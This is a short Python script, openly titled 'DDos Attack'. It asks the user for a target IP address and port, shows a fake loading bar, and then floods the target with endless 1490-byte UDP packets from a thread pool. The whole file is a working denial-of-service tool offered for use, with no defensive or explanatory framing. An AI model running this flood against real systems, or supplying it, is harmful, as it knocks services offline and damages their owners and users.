import sys
import os
import time
import socket
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
ip = input("IP Target: ")
port = int(input("Port: "))

os.system("cls")
print("[                    ] 0%")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(3)
print("[====================] 100%")
time.sleep(2)
sent = 0

def attack():
    global sent
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        print("Sent %s packet to %s through port: %s" % (sent, ip, port))

# Create a ThreadPoolExecutor with 10 worker threads
executor = ThreadPoolExecutor(max_workers=10)

# Submit the attack function to the executor 10 times
for _ in range(10000):
    executor.submit(attack)

# Wait for all submitted tasks to complete
executor.shutdown(wait=True)
